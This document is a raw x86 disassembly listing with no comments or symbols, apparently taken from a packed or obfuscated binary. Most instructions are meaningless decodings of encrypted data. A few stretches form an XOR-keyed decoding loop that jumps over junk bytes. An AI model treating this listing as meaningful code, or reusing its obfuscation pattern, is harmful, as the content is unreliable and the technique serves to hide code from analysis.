  405966:	and    BYTE PTR [eax+0x67519282],0xb2
  40596d:	repz bound edx,QWORD PTR [edi]
  405970:	mov    edx,0xc67b806b
  405975:	aad    0xef
  405977:	mov    bl,BYTE PTR ds:0xdacc44ac
  40597d:	cmp    edx,ebx
  40597f:	mov    bl,0x6c
  405981:	mov    dh,0x12
  405983:	mov    ah,0x28
  405985:	call   0x6f42ffdb
  40598a:	mov    esi,0x61388b2c
  40598f:	push   esi
  405990:	retf   
  405991:	or     DWORD PTR [edx*2-0x4d1d9cd3],0xc984bcf9
  40599c:	stc    
  40599d:	ins    DWORD PTR es:[edi],dx
  40599e:	test   BYTE PTR ds:0x45e9f2e7,ah
  4059a4:	bound  esi,QWORD PTR [ecx-0x569f22]
  4059aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ab:	and    eax,DWORD PTR [edx]
  4059ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ae:	mov    esi,0x6bfb6194
  4059b3:	jmp    0xd669:0xe11998b7
  4059ba:	test   eax,0x4ba01189
  4059bf:	push   ss
  4059c0:	push   ebp
  4059c1:	(bad)  
  4059c2:	or     eax,edi
  4059c4:	imul   ebx,DWORD PTR [edi-0x42],0x25f281f1
  4059cb:	loop   0x4059d4
  4059cd:	pushf  
  4059ce:	int3   
  4059cf:	xor    ebp,DWORD PTR [ecx-0x3a1b83bc]
  4059d5:	mov    DWORD PTR [ebx],esi
  4059d7:	es mov ebx,gs
  4059da:	ins    DWORD PTR es:[edi],dx
  4059db:	dec    ebx
  4059dc:	xor    BYTE PTR [ecx],dl
  4059de:	sbb    DWORD PTR [edx],0x496a21fc
  4059e4:	ror    esp,0xac
  4059e7:	ret    
  4059e8:	aam    0x65
  4059ea:	imul   ecx,DWORD PTR [edx+0x38536824],0x5e
  4059f1:	xchg   ecx,eax
  4059f2:	pop    ebx
  4059f3:	pop    ebx
  4059f4:	mov    esp,0xfd49d23f
  4059f9:	pop    ebp
  4059fa:	jnp    0x4059df
  4059fc:	pop    edi
  4059fd:	mov    cl,0xc9
  4059ff:	(bad)  
  405a00:	shr    dl,1
  405a02:	adc    dl,ch
  405a04:	cmp    eax,0xbd24de71
  405a09:	adc    BYTE PTR [ebx+esi*2+0x68],bl
  405a0d:	jge    0x405a1a
  405a0f:	cmp    eax,0xea1422b7
  405a14:	stos   BYTE PTR es:[edi],al
  405a15:	leave  
  405a16:	sbb    al,0x5
  405a18:	jb     0x405a66
  405a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a1b:	or     eax,0x575284a5
  405a20:	add    al,0x4b
  405a22:	inc    ebp
  405a23:	cs push 0x2e
  405a26:	adc    eax,0x442b5a
  405a2b:	push   0xe85d3671
  405a30:	out    0x5,al
  405a32:	into   
  405a33:	jbe    0x4059ba
  405a35:	jmp    0x157:0x10bdc339
  405a3c:	sbb    al,0xea
  405a3e:	push   ebp
  405a3f:	push   ss
  405a40:	dec    eax
  405a41:	in     al,dx
  405a42:	jge    0x4059e5
  405a44:	mov    edi,0xae6d82cb
  405a49:	jmp    0x405a07
  405a4b:	and    dh,BYTE PTR [edx+ebp*8-0x22e8abd0]
  405a52:	pop    ebp
  405a53:	sbb    bl,al
  405a55:	dec    edi
  405a56:	mov    ds:0xb5477b90,eax
  405a5b:	iret   
  405a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a5d:	pop    edi
  405a5e:	repnz pushf 
  405a60:	stos   DWORD PTR es:[edi],eax
  405a61:	cwde   
  405a62:	test   DWORD PTR [edi-0x5ec67bfa],ebx
  405a68:	imul   ebx,DWORD PTR [eax+0x51],0xddc70991
  405a6f:	or     DWORD PTR [ebp+0x57],edi
  405a72:	sub    al,0xa7
  405a74:	(bad)  
  405a75:	in     eax,0xf0
  405a77:	(bad)  
  405a78:	iret   
  405a79:	push   esi
  405a7a:	add    DWORD PTR [edx],ebx
  405a7c:	out    0x9b,al
  405a7e:	stc    
  405a7f:	inc    ebx
  405a80:	daa    
  405a81:	push   ss
  405a82:	or     DWORD PTR es:0x47348ef,ecx
  405a89:	out    0x9a,al
  405a8b:	jecxz  0x405af0
  405a8d:	pop    eax
  405a8e:	push   esi
  405a8f:	das    
  405a90:	fstp   QWORD PTR [eax+0x66]
  405a93:	inc    ecx
  405a94:	inc    eax
  405a95:	push   edx
  405a96:	jg     0x405a82
  405a98:	aaa    
  405a99:	scas   al,BYTE PTR es:[edi]
  405a9a:	pop    esp
  405a9b:	retf   0xf2be
  405a9e:	mov    eax,ds:0x865732
  405aa3:	in     al,0x89
  405aa5:	mov    edi,0xb6300e2
  405aaa:	test   DWORD PTR [eax-0xe],edi
  405aad:	loopne 0x405b18
  405aaf:	inc    ebx
  405ab0:	sub    edx,DWORD PTR [ebp+0xf]
  405ab3:	or     eax,0xb0aa6f24
  405ab8:	imul   edi,DWORD PTR [ecx-0x50a94b5d],0xffffffcc
  405abf:	dec    ebp
  405ac0:	bound  eax,QWORD PTR [edx-0x3e]
  405ac3:	pop    ds
  405ac4:	mov    esp,0xa0794acb
  405ac9:	ret    
  405aca:	iret   
  405acb:	push   esi
  405acc:	mov    ds:0x188d16a8,al
  405ad1:	jne    0x405a6c
  405ad3:	dec    esi
  405ad4:	aaa    
  405ad5:	mov    dl,0xa0
  405ad7:	pusha  
  405ad8:	ss ja  0x405ae2
  405adb:	mov    al,ds:0xb7320242
  405ae0:	sub    BYTE PTR [eax+ebx*1-0x2c563620],0x4e
  405ae8:	push   es
  405ae9:	or     ch,cl
  405aeb:	add    eax,0x9954d93c
  405af0:	dec    edi
  405af1:	and    eax,0xfaad1407
  405af6:	ds icebp 
  405af8:	icebp  
  405af9:	test   BYTE PTR [edx],dh
  405afb:	jo     0x405b58
  405afd:	push   cs
  405afe:	repnz pop ebp
  405b00:	fnstenv [ebp-0x7b90f1f7]
  405b06:	dec    ebp
  405b07:	push   ebx
  405b08:	arpl   WORD PTR [edx+0x499c0a95],bp
  405b0e:	xor    esp,DWORD PTR [edx+edx*1-0x69]
  405b12:	daa    
  405b13:	fisub  DWORD PTR ds:[esi+ebx*2]
  405b17:	pop    eax
  405b18:	mov    bl,0xde
  405b1a:	retf   
  405b1b:	xor    BYTE PTR [ecx-0x501ce259],bh
  405b21:	pop    edi
  405b22:	inc    ecx
  405b23:	xor    BYTE PTR [ecx-0x55914aa9],bl
  405b29:	daa    
  405b2a:	adc    esi,DWORD PTR [ecx+0x46]
  405b2d:	jg     0x405ae8
  405b2f:	xor    eax,0x36cfbc6c
  405b34:	xchg   esp,eax
  405b35:	jb     0x405bb4
  405b37:	popf   
  405b38:	and    cl,dh
  405b3a:	cmp    ah,BYTE PTR [eax]
  405b3c:	out    dx,eax
  405b3d:	loopne 0x405ac3
  405b3f:	retf   0xc722
  405b42:	and    esi,DWORD PTR [edx-0x49]
  405b45:	mov    ebp,DWORD PTR [ebp+0x77d827a]
  405b4b:	xchg   ebp,eax
  405b4c:	dec    esi
  405b4d:	cwde   
  405b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b4f:	mov    fs,WORD PTR [edi-0x4e]
  405b52:	outs   dx,DWORD PTR ds:[esi]
  405b53:	push   eax
  405b54:	aad    0xc
  405b56:	jge    0x405b81
  405b58:	adc    ecx,DWORD PTR [ebx+0x6e]
  405b5b:	int3   
  405b5c:	inc    edi
  405b5d:	jae    0x405b3d
  405b5f:	pusha  
  405b60:	cwde   
  405b61:	mov    esi,0xb6814a0b
  405b66:	jge    0x405bb6
  405b68:	rol    DWORD PTR [edi-0x42c7b563],cl
  405b6e:	rol    DWORD PTR [edx-0x23],1
  405b71:	inc    esp
  405b72:	cmp    BYTE PTR [edi+0x46b453c0],ch
  405b78:	mov    al,ds:0x2a02eacd
  405b7d:	push   ebx
  405b7e:	test   eax,0xae70aee0
  405b83:	repnz or DWORD PTR ds:0xc25d9933,0x8244edf0
  405b8e:	data16 clc 
  405b90:	and    eax,0x18761eff
  405b95:	ss ret 0xc3cb
  405b99:	repnz ds mov dl,0x1a
  405b9d:	test   eax,0xbe8806b1
  405ba2:	bnd call 0xa89d54fb
  405ba8:	pushf  
  405ba9:	jg     0x405bc1
  405bab:	push   ebp
  405bac:	jg     0x405bb1
  405bae:	repz xlat BYTE PTR ds:[ebx]
  405bb0:	stc    
  405bb1:	sbb    BYTE PTR [eax-0x3680b562],dl
  405bb7:	lods   eax,DWORD PTR ds:[esi]
  405bb8:	pop    ecx
  405bb9:	add    ah,BYTE PTR gs:[ecx+0x7315924e]
  405bc0:	sub    DWORD PTR [ecx-0x20],ebp
  405bc3:	jecxz  0x405b63
  405bc5:	in     al,0x6d
  405bc7:	jmp    0x3ccc:0xeb77e05d
  405bce:	mov    DWORD PTR [edi+0x4af64052],ecx
  405bd4:	or     al,0xdf
  405bd6:	push   ebp
  405bd7:	fst    DWORD PTR [esp+ebp*8]
  405bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bdb:	mov    cl,0x67
  405bdd:	fsubrp st(2),st
  405bdf:	pop    ebx
  405be0:	pop    edx
  405be1:	(bad)  
  405be2:	das    
  405be3:	cmp    ebp,edx
  405be5:	fwait
  405be6:	dec    esp
  405be7:	xchg   esp,eax
  405be8:	jmp    0xc768:0x2d2a7991
  405bef:	mov    ebp,0x3534f30f
  405bf4:	mov    al,ds:0xb64eda08
  405bf9:	out    0x74,al
  405bfb:	nop
  405bfc:	fs sub al,0x57
  405bff:	jmp    0x405ba8
  405c01:	cmp    DWORD PTR [edx],esi
  405c03:	or     eax,0xad8a2a87
  405c08:	shl    BYTE PTR [ebp-0x29f8228c],1
  405c0e:	jnp    0x405c3b
  405c10:	clc    
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xe05d0ed0,dx
  405c45:	or     eax,0x3b5012ca
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0x617e7e71
  405c51:	push   esi
  405c52:	daa    
  405c53:	leave  
  405c54:	daa    
  405c55:	fadd   QWORD PTR [eax+ebx*2]
  405c58:	popf   
  405c59:	jp     0x405c1f
  405c5b:	or     BYTE PTR es:[ecx+0x462c0176],0xf
  405c63:	aaa    
  405c64:	jp     0x405c9f
  405c66:	(bad)  
  405c67:	ret    
  405c68:	push   eax
  405c69:	lahf   
  405c6a:	into   
  405c6b:	stos   BYTE PTR es:[edi],al
  405c6c:	dec    eax
  405c6d:	mov    eax,0xa2347a9c
  405c72:	or     BYTE PTR [ebx-0x97fa47],al
  405c78:	stc    
  405c79:	pop    esi
  405c7a:	mov    ah,0xb5
  405c7c:	into   
  405c7d:	mov    dl,0x1c
  405c7f:	cli    
  405c80:	sub    BYTE PTR ds:0xcc514ccf,0x63
  405c87:	inc    edi
  405c88:	pusha  
  405c89:	jp     0x405cf4
  405c8b:	inc    esp
  405c8c:	mov    ds:0xcd30e13e,eax
  405c91:	iret   
  405c92:	push   esp
  405c93:	addr16 push cs
  405c95:	popf   
  405c96:	scas   eax,DWORD PTR es:[edi]
  405c97:	out    0x45,al
  405c99:	dec    edx
  405c9a:	clc    
  405c9b:	lock jp 0x405c3c
  405c9e:	or     esi,esi
  405ca0:	ins    DWORD PTR es:[edi],dx
  405ca1:	adc    BYTE PTR [eax+ebp*8],cl
  405ca4:	ror    BYTE PTR [edx],1
  405ca6:	ins    BYTE PTR es:[edi],dx
  405ca7:	ret    0x2414
  405caa:	iret   
  405cab:	scas   al,BYTE PTR es:[edi]
  405cac:	cmc    
  405cad:	sbb    eax,0x82a68ee7
  405cb2:	ds or  eax,0xd55b154b
  405cb8:	stos   BYTE PTR es:[edi],al
  405cb9:	in     al,0x6b
  405cbb:	xchg   ebp,eax
  405cbc:	inc    ebx
  405cbd:	sbb    BYTE PTR [ebx+esi*1],al
  405cc0:	in     eax,0x96
  405cc2:	rol    BYTE PTR [esp+ebp*2],cl
  405cc5:	sub    al,0xca
  405cc7:	push   ebx
  405cc8:	ret    0x61c2
  405ccb:	lods   al,BYTE PTR ds:[esi]
  405ccc:	xchg   ebp,eax
  405ccd:	(bad)  
  405cce:	jae    0x405ca1
  405cd0:	mov    WORD PTR [esi+0x62],ss
  405cd3:	clc    
  405cd4:	fs popa 
  405cd6:	fst    QWORD PTR [ecx]
  405cd8:	sahf   
  405cd9:	lods   al,BYTE PTR ds:[esi]
  405cda:	stos   BYTE PTR es:[edi],al
  405cdb:	in     al,0x5a
  405cdd:	mov    dl,0xf7
  405cdf:	inc    ecx
  405ce0:	mov    eax,0x2b5bdbb2
  405ce5:	out    0x1f,eax
  405ce7:	test   eax,0xaee6f00f
  405cec:	mov    ecx,0xf7d3c35a
  405cf1:	into   
  405cf2:	mov    eax,0xf93ef928
  405cf7:	jo     0x405cfe
  405cf9:	enter  0x13de,0x6c
  405cfd:	(bad)  
  405cfe:	cmp    BYTE PTR [edi-0x2e],ch
  405d01:	fsub   QWORD PTR ds:0xb3386bc6
  405d07:	add    al,0x5d
  405d09:	dec    ecx
  405d0a:	(bad)  
  405d0b:	out    0xea,eax
  405d0d:	cwde   
  405d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d0f:	popa   
  405d10:	popf   
  405d11:	popf   
  405d12:	xchg   ebp,eax
  405d13:	sbb    esp,edi
  405d15:	dec    esi
  405d16:	neg    BYTE PTR [ecx+0x58]
  405d19:	js     0x405d4b
  405d1b:	jl     0x405cee
  405d1d:	ret    0xd47f
  405d20:	stos   DWORD PTR es:[edi],eax
  405d21:	ja     0x405cea
  405d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d24:	in     al,dx
  405d25:	rcl    BYTE PTR [ecx-0x28e40092],cl
  405d2b:	push   cs
  405d2c:	mov    dl,0x3d
  405d2e:	cld    
  405d2f:	popf   
  405d30:	cs pop ds
  405d32:	adc    BYTE PTR [ebx+ebp*8],al
  405d35:	mov    al,0xe2
  405d37:	aaa    
  405d38:	xor    eax,0x51073c78
  405d3d:	add    DWORD PTR [ebx],ecx
  405d3f:	or     BYTE PTR [esi-0x5fb6fd66],dh
  405d45:	mov    al,ds:0x5ac56dc
  405d4a:	call   0xc436:0x6653cfc4
  405d51:	and    BYTE PTR [eax+0x8e22ecf],bl
  405d57:	dec    ebx
  405d58:	sub    DWORD PTR [ebx],0xffffff92
  405d5b:	mov    DWORD PTR [esi],ebx
  405d5d:	jecxz  0x405d83
  405d5f:	in     eax,dx
  405d60:	in     al,dx
  405d61:	and    BYTE PTR [ecx],bl
  405d63:	dec    edi
  405d64:	shl    dh,0xe2
  405d67:	inc    esp
  405d68:	fisttp DWORD PTR [eax-0x4b]
  405d6b:	mov    ebx,DWORD PTR ds:0x47cc1442
  405d71:	jbe    0x405dcc
  405d73:	xor    esp,DWORD PTR [ecx]
  405d75:	push   0xffffffd7
  405d77:	lahf   
  405d78:	add    eax,DWORD PTR [ecx+0x4f95b337]
  405d7e:	and    eax,0xf5ef6442
  405d83:	jecxz  0x405d25
  405d85:	imul   esi,edx,0xbf85c87b
  405d8b:	xor    BYTE PTR [ebx+0x40a58208],ch
  405d91:	add    BYTE PTR [edx],0xb3
  405d94:	js     0x405df6
  405d96:	neg    cl
  405d98:	xchg   esp,eax
  405d99:	xchg   edi,eax
  405d9a:	xchg   ecx,eax
  405d9b:	int    0xad
  405d9d:	loope  0x405dd5
  405d9f:	and    al,0x6
  405da1:	(bad)  
  405da2:	out    0xa6,eax
  405da4:	repnz mov bh,0xa
  405da7:	hlt    
  405da8:	movups xmm3,XMMWORD PTR [ecx+0x3fac74d]
  405daf:	ds jl  0x405d32
  405db2:	adc    BYTE PTR [ecx],ah
  405db4:	fcomp  QWORD PTR [ebp-0x93bcbc1]
  405dba:	dec    eax
  405dbb:	and    al,0x9
  405dbd:	loopne 0x405dba
  405dbf:	bound  edi,QWORD PTR [ecx-0x7020c922]
  405dc5:	icebp  
  405dc6:	fsub   DWORD PTR [ebx]
  405dc8:	inc    ebp
  405dc9:	xlat   BYTE PTR ds:[ebx]
  405dca:	pop    ds
  405dcb:	aaa    
  405dcc:	xchg   ebp,eax
  405dcd:	push   esi
  405dce:	cmp    BYTE PTR [ebx-0x2c09793c],dl
  405dd4:	sbb    al,0x78
  405dd6:	adc    esp,DWORD PTR [ecx]
  405dd8:	mov    gs,WORD PTR [edi-0x5ac53ce5]
  405dde:	add    BYTE PTR [edi+0x52],0x6f
  405de2:	aaa    
  405de3:	dec    esi
  405de4:	idiv   ch
  405de6:	sbb    BYTE PTR [ecx-0x2b],dh
  405de9:	sbb    edi,edx
  405deb:	dec    edx
  405dec:	loop   0x405e30
  405dee:	mov    al,0x62
  405df0:	pop    esp
  405df1:	adc    al,0x9b
  405df3:	nop
  405df4:	and    ah,dh
  405df6:	xor    ebx,esp
  405df8:	mov    ebx,0x2b0d65f0
  405dfd:	push   esp
  405dfe:	stos   BYTE PTR es:[edi],al
  405dff:	and    al,0x8d
  405e01:	adc    DWORD PTR [eax],esi
  405e03:	sbb    al,0xa1
  405e05:	sbb    eax,0x469387c5
  405e0a:	push   esp
  405e0b:	les    ecx,FWORD PTR [eax]
  405e0d:	pop    ebx
  405e0e:	sbb    DWORD PTR [ecx-0x60e0c5e7],0xc3c1c84d
  405e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e19:	fist   WORD PTR [ebx+eax*2]
  405e1c:	mov    ds:0x6ad1e5b6,eax
  405e21:	and    ch,BYTE PTR [ebx+0x3f]
  405e24:	dec    esp
  405e25:	and    eax,0xae267038
  405e2a:	loopne 0x405e8a
  405e2c:	call   0xc837:0x1e5bcaa8
  405e33:	sub    DWORD PTR [edi+ebx*4+0x38],ebp
  405e37:	js     0x405dca
  405e39:	or     ah,BYTE PTR [eax-0x5c]
  405e3c:	and    BYTE PTR [edi+0x76],bh
  405e3f:	mov    ch,0xb0
  405e41:	cmp    edx,DWORD PTR [ebx-0x3f85ae62]
  405e47:	lods   eax,DWORD PTR ds:[esi]
  405e48:	lds    esi,FWORD PTR [esi+0x40]
  405e4b:	outs   dx,BYTE PTR ds:[esi]
  405e4c:	inc    eax
  405e4d:	cwde   
  405e4e:	sar    BYTE PTR [ebp-0x38],cl
  405e51:	out    dx,al
  405e52:	(bad)  
  405e53:	hlt    
  405e54:	outs   dx,BYTE PTR ds:[esi]
  405e55:	inc    esp
  405e56:	in     eax,dx
  405e57:	sbb    DWORD PTR [ebx-0x4d287d7e],esp
  405e5d:	adc    ch,BYTE PTR [ebp-0x2745c553]
  405e63:	loope  0x405ee1
  405e65:	cmp    eax,0x7bd4a506
  405e6a:	leave  
  405e6b:	push   eax
  405e6c:	mov    ebx,eax
  405e6e:	mov    edi,0x94da2e2e
  405e73:	aam    0xde
  405e75:	cmc    
  405e76:	js     0x405e6a
  405e78:	loope  0x405e08
  405e7a:	je     0x405e41
  405e7c:	add    eax,0x33f41dd
  405e81:	dec    ebx
  405e82:	repnz dec edi
  405e84:	call   0xce8e:0xccfcc619
  405e8b:	jecxz  0x405e47
  405e8d:	jbe    0x405ef2
  405e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e90:	push   ss
  405e91:	or     cl,BYTE PTR [eax-0x4e]
  405e94:	ror    DWORD PTR [ebp-0x7b],cl
  405e97:	iret   
  405e98:	cwde   
  405e99:	test   BYTE PTR [ebp+0x1f17fb4e],bh
  405e9f:	adc    eax,0xae5daac6
  405ea4:	retf   
  405ea5:	add    BYTE PTR [edx+edi*8],bl
  405ea8:	mov    ebx,0x470de320
  405ead:	push   ds
  405eae:	aas    
  405eaf:	test   eax,0xd5d2e54a
  405eb4:	ins    BYTE PTR es:[edi],dx
  405eb5:	add    eax,0x2a51b885
  405eba:	add    eax,0x5180ab95
  405ebf:	dec    esp
  405ec0:	xor    BYTE PTR [eax+ebp*2+0x19888351],0xed
  405ec8:	cmc    
  405ec9:	pop    eax
  405eca:	ins    DWORD PTR es:[edi],dx
  405ecb:	fwait
  405ecc:	add    esp,edx
  405ece:	xor    DWORD PTR [ebp-0x21],edx
  405ed1:	fcmovbe st,st(6)
  405ed3:	jmp    0x405e88
  405ed5:	cmp    al,0xd6
  405ed7:	sar    DWORD PTR [edx-0xc],1
  405eda:	or     dl,bl
  405edc:	(bad)  
  405edd:	shr    cl,cl
  405edf:	mov    BYTE PTR [ebx-0x4bfbf8c6],al
  405ee5:	loopne 0x405f50
  405ee7:	pop    ds
  405ee8:	outs   dx,BYTE PTR ds:[esi]
  405ee9:	or     eax,0x269f13a4
  405eee:	sub    ebp,DWORD PTR [ebp+edx*8-0x487a1233]
  405ef5:	in     al,dx
  405ef6:	jp     0x405f4b
  405ef8:	pop    ds
  405ef9:	jns    0x405f44
  405efb:	sbb    DWORD PTR [ecx-0x10b8a77a],esi
  405f01:	mov    ds:0x85795b8a,al
  405f06:	sbb    eax,0x29404b9c
  405f0b:	cmp    esp,ecx
  405f0d:	adc    al,0xf7
  405f0f:	push   esp
  405f10:	sbb    eax,0xb93e969c
  405f15:	dec    edi
  405f16:	adc    DWORD PTR [edx+esi*4-0x7201dda4],esp
  405f1d:	mov    BYTE PTR [edx],al
  405f1f:	arpl   WORD PTR [esi],dx
  405f21:	neg    BYTE PTR ds:0x86728221
  405f27:	mov    esp,0x7b49e7c6
  405f2c:	xchg   dl,ch
  405f2e:	imul   ebp,DWORD PTR [ebx+0x60d73bc9],0x79
  405f35:	mov    gs,esp
  405f37:	test   DWORD PTR [edx-0xd34dc47],0x827cbe6
  405f41:	popa   
  405f42:	pop    esp
  405f43:	or     DWORD PTR ds:0x85e2229,esi
  405f49:	div    DWORD PTR [eax]
  405f4b:	mov    ds:0x8b33143c,al
  405f50:	cmp    DWORD PTR [eax+0x11022dc7],edx
  405f56:	popf   
  405f57:	xchg   ebp,eax
  405f58:	add    al,0xb9
  405f5a:	ja     0x405ee9
  405f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f5d:	xor    eax,0x60d0e3e2
  405f62:	outs   dx,BYTE PTR ds:[esi]
  405f63:	xchg   esi,eax
  405f64:	mov    al,bh
  405f66:	mov    dh,0x8d
  405f68:	mov    dh,0x2c
  405f6a:	lock pop es
  405f6c:	fstp   TBYTE PTR [eax-0x7a303748]
  405f72:	mov    bh,0x27
  405f74:	dec    BYTE PTR [edi*8-0x2dd6c86a]
  405f7b:	push   eax
  405f7c:	mov    ds:0xc77d3653,eax
  405f81:	rcr    DWORD PTR [edx+0x54d3c1eb],cl
  405f87:	cs jge 0x405fe3
  405f8a:	mov    edx,0x1a0ded0e
  405f8f:	pushf  
  405f90:	xor    esi,edx
  405f92:	push   0x44f8afb2
  405f97:	repnz (bad) 
  405f99:	mov    ecx,ecx
  405f9b:	es popa 
  405f9d:	xor    DWORD PTR [ebp+0x68],0xdd27c6a4
  405fa4:	aam    0x6d
  405fa6:	mov    ebp,0xb9b4fb31
  405fab:	add    BYTE PTR [edx-0xba99b0c],al
  405fb1:	retf   0xd52b
  405fb4:	and    eax,DWORD PTR [edx-0x7b40267e]
  405fba:	xchg   esp,eax
  405fbb:	lahf   
  405fbc:	jno    0x405fd6
  405fbe:	fisubr DWORD PTR [ecx]
  405fc0:	xor    bl,BYTE PTR [ebx-0x727c4609]
  405fc6:	popf   
  405fc7:	inc    ebx
  405fc8:	out    0xa7,al
  405fca:	pop    es
  405fcb:	jmp    0x405f73
  405fcd:	mov    esp,0xe6ceb705
  405fd2:	out    dx,al
  405fd3:	bound  edi,QWORD PTR [ecx-0x33995d83]
  405fd9:	sub    al,0xe7
  405fdb:	sbb    al,dh
  405fdd:	retf   0xffd6
  405fe0:	adc    edx,ebx
  405fe2:	push   cs
  405fe3:	imul   ebp,eax,0xffffff8b
  405fe6:	push   cs
  405fe7:	stc    
  405fe8:	or     al,0x74
  405fea:	out    0x97,al
  405fec:	ja     0x405fbe
  405fee:	sbb    DWORD PTR [edx],0xddfe6df2
  405ff4:	loopne 0x405fd2
  405ff6:	adc    BYTE PTR [ebx],dh
  405ff8:	es jns 0x405fed
  405ffb:	stos   DWORD PTR es:[edi],eax
  405ffc:	aam    0x13
  405ffe:	mov    WORD PTR [ebx+0x54fed2b3],?
  406004:	out    dx,al
  406005:	ret    0x1cba
  406008:	inc    esp
  406009:	mov    ds:0x115256b9,al
  40600e:	scas   al,BYTE PTR es:[edi]
  40600f:	add    edi,esi
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	outs   dx,BYTE PTR ds:[esi]
  406057:	out    dx,eax
  406058:	pop    ebp
  406059:	jno    0x405ffa
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xcd7e7e71
  406063:	ins    DWORD PTR es:[edi],dx
  406064:	lock sbb BYTE PTR [esi],dl
  406067:	(bad)  
  406068:	mov    ah,0xbb
  40606a:	push   es
  40606b:	pusha  
  40606c:	or     BYTE PTR [edx+edx*1],bh
  40606f:	jae    0x4060ce
  406071:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406072:	inc    ebp
  406073:	or     ebx,esp
  406075:	test   DWORD PTR [ebx+ecx*2],eax
  406078:	test   eax,0x1cb50927
  40607d:	sbb    DWORD PTR ds:0xcbdadd80,esi
  406083:	push   ebp
  406084:	jb     0x40600d
  406086:	js     0x406056
  406088:	sbb    DWORD PTR [edi+0x3d],esp
  40608b:	or     esp,DWORD PTR [ebp-0x4748c031]
  406091:	int    0x3a
  406093:	sub    BYTE PTR [ebp-0x80],dl
  406096:	and    al,0xde
  406098:	sub    al,0x54
  40609a:	xchg   ebp,eax
  40609b:	retf   0xfa65
  40609e:	stos   BYTE PTR es:[edi],al
  40609f:	add    dh,BYTE PTR [ebx]
  4060a1:	and    DWORD PTR [eax+0x4990749],ebp
  4060a7:	dec    ebp
  4060a8:	mov    ah,0xd1
  4060aa:	ror    DWORD PTR [ecx],1
  4060ac:	sahf   
  4060ad:	pop    ds
  4060ae:	inc    ebx
  4060af:	mov    ah,0xac
  4060b1:	inc    edi
  4060b2:	mov    ah,BYTE PTR [ebx-0x1a]
  4060b5:	mul    cl
  4060b7:	aad    0x5e
  4060b9:	mov    eax,0x203ea14b
  4060be:	mov    dl,0x5d
  4060c0:	xor    DWORD PTR [edi-0x15e43027],eax
  4060c6:	in     eax,0x32
  4060c8:	test   al,0x5d
  4060ca:	adc    eax,0xe9de5020
  4060cf:	stos   BYTE PTR es:[edi],al
  4060d0:	pop    eax
  4060d1:	ins    DWORD PTR es:[edi],dx
  4060d2:	outs   dx,DWORD PTR ds:[esi]
  4060d3:	imul   ebp,DWORD PTR [ebx+ebp*1],0xffffff82
  4060d7:	fcomp  DWORD PTR [ecx-0x12b517ac]
  4060dd:	imul   esi,DWORD PTR [edx+0x736950c4],0x59
  4060e4:	ja     0x4060f6
  4060e6:	(bad)  
  4060e7:	das    
  4060e8:	sbb    al,0x5d
  4060ea:	mov    edi,0x14c2d4c6
  4060ef:	cmp    si,WORD PTR [ecx-0x76eae370]
  4060f6:	dec    edx
  4060f7:	int    0x39
  4060f9:	shr    DWORD PTR [ebp+0x3c78046d],1
  4060ff:	jmpw   0xc42f
  406103:	pop    eax
  406104:	sub    BYTE PTR ds:0x8ed9133c,cl
  40610a:	test   eax,0x943c842d
  40610f:	xchg   ebx,eax
  406110:	jb     0x4060ce
  406112:	mov    esp,0x351ea481
  406117:	cmp    al,0x7e
  406119:	sbb    DWORD PTR [edi],ebx
  40611b:	adc    dl,bh
  40611d:	cwde   
  40611e:	cli    
  40611f:	mov    ebx,0xd44e3d1f
  406124:	mov    ds:0x2f388932,al
  406129:	cmp    BYTE PTR [ebp-0x29],0x69
  40612d:	xchg   ebp,eax
  40612e:	mov    ah,BYTE PTR [edi+0x3]
  406131:	arpl   si,dx
  406133:	dec    esp
  406134:	jae    0x406191
  406136:	lock mov bl,0xbd
  406139:	test   BYTE PTR [ecx+0x1c],cl
  40613c:	add    eax,0x47e008b7
  406141:	ss jge 0x4061b9
  406144:	mov    bh,0xa4
  406146:	clc    
  406147:	ret    
  406148:	repz mov edx,DWORD PTR [ebx-0x69]
  40614c:	int3   
  40614d:	mov    ds:0x4cdb5a9c,eax
  406152:	mov    ecx,0xc3fdd19
  406157:	push   ebx
  406158:	jno    0x40612b
  40615a:	cmp    dh,BYTE PTR [eax]
  40615c:	call   0x72fa3bca
  406161:	aad    0x80
  406163:	fstp   QWORD PTR [ebp+0x5768ed52]
